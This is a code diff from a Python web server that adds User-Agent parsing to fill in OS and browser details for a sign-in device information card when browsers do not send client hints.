@@ -2342,6 +2342,44 @@ def _os_name(uaplat: str, osver: str) -> str:
     return uaplat or ""
 
 
+def _ua_os_browser(ua: str):
+    """Parse (os, browser+version) from a User-Agent, for devices that don't send
+    client hints (iPhone/iPad Safari, Firefox). This is how the phone card fills in
+    its OS and browser when getHighEntropyValues isn't available."""
+    low = (ua or "").lower()
+    os_s = ""
+    m = re.search(r"iphone os (\d+[_.]\d+(?:[_.]\d+)?)", low)
+    if m:
+        os_s = "iOS " + m.group(1).replace("_", ".")
+    elif "ipad" in low or ("cpu os" in low and "like mac" in low):
+        m = re.search(r"os (\d+[_.]\d+(?:[_.]\d+)?)", low)
+        os_s = "iPadOS " + m.group(1).replace("_", ".") if m else "iPadOS"
+    elif "android" in low:
+        m = re.search(r"android (\d+(?:\.\d+)?)", low)
+        os_s = "Android " + m.group(1) if m else "Android"
+    elif "windows nt" in low:
+        m = re.search(r"windows nt (\d+\.\d+)", low)
+        os_s = {"10.0": "Windows 10/11", "6.3": "Windows 8.1", "6.1": "Windows 7"}.get(
+            m.group(1) if m else "", "Windows")
+    elif "mac os x" in low:
+        m = re.search(r"mac os x (\d+[_.]\d+(?:[_.]\d+)?)", low)
+        os_s = "macOS " + m.group(1).replace("_", ".") if m else "macOS"
+    elif "cros" in low:
+        os_s = "ChromeOS"
+    elif "linux" in low:
+        os_s = "Linux"
+    br = ""
+    if "edg/" in low:
+        m = re.search(r"edg/(\d+)", low); br = "Edge " + (m.group(1) if m else "")
+    elif "firefox/" in low:
+        m = re.search(r"firefox/(\d+)", low); br = "Firefox " + (m.group(1) if m else "")
+    elif "chrome/" in low and "edg/" not in low:
+        m = re.search(r"chrome/(\d+)", low); br = "Chrome " + (m.group(1) if m else "")
+    elif "version/" in low and "safari" in low:
+        m = re.search(r"version/(\d+(?:\.\d+)?)", low); br = "Safari " + (m.group(1) if m else "")
+    return os_s.strip(), br.strip()
+
+
 async def _h_signin_sys(request):
     """Client-reported device + system info for the current sign-in: screen, CPU,
     RAM, GPU, network, timezone, platform, browser, languages - everything the
@@ -2379,12 +2417,15 @@ async def _h_signin_sys(request):
         fields.append({"name": "🆔 Device ID", "value": idval[:256], "inline": True})
     if b.get("automation"):
         fields.append({"name": "🤖 Automation", "value": "⚠️ webdriver / headless flag set", "inline": True})
+    ua_os, ua_br = _ua_os_browser(request.headers.get("User-Agent", ""))
+    osname = (_os_name(g("uaplat"), g("osver")) if g("uaplat") else "") or ua_os or g("platform")
     plat = " · ".join(x for x in (
-        _os_name(g("uaplat") or g("platform"), g("osver")),
+        osname,
         (f"v{g('osver')}" if g("osver") else ""),
         g("arch"),
         (f"model {g('model')}" if g("model") else ""),
-        ("mobile" if b.get("mobile") else "desktop / PC"),
+        ("mobile" if b.get("mobile") or any(k in osname.lower() for k in ("ios", "ipad", "android"))
+         else "desktop / PC"),
     ) if x)
     if plat:
         fields.append({"name": "💻 Platform / OS", "value": plat[:200], "inline": True})
@@ -2433,7 +2474,9 @@ async def _h_signin_sys(request):
         fields.append({"name": "🕰️ Device timezone", "value": tzline[:160], "inline": True})
     if g("langs") or g("lang"):
         fields.append({"name": "🗣️ Languages", "value": (g("langs") or g("lang"))[:128], "inline": True})
-    brow = " · ".join(x for x in (g("brands"), (f"v{g('uafull')}" if g("uafull") else ""), g("vendor")) if x)
+    brow = " · ".join(x for x in (
+        (g("brands") or ua_br), (f"v{g('uafull')}" if g("uafull") else ""), g("vendor"),
+    ) if x)
     if brow:
         fields.append({"name": "🧩 Browser", "value": brow[:256], "inline": True})
     flags = " · ".join(x for x in (
